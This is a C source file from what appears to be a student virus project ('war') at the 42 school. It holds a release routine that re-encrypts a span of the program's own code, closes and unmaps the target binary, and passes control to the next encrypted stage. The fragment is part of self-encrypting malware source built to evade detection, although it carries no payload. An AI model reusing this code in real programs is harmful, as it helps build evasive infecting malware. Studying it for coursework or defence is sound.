/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   release.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 18:22:50 by ddinaut           #+#    #+#             */
/*   Updated: 2019/03/31 20:49:45 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

void		release(t_data *data)
{
//	revert_one(&data->key, (char*)inject, (size_t)release - (size_t)inject);

#ifdef DEBUG
	char de[] = "release\t \n";
	data->context == true ?	de[8] = 49 : 48;
	_write(1, de, _strlen(de));
#endif

	update_one(&data->key, (char*)release, (size_t)cypher_end - (size_t)release);

	if (data->context == true || data->context == false)
	{
		_close(data->bin.fd);
		_munmap(data->bin.map, data->bin.size);
	}

//	revert_one(&data->key, (char*)cypher_end, (size_t)end - (size_t)release);
	cypher_end(data);
}
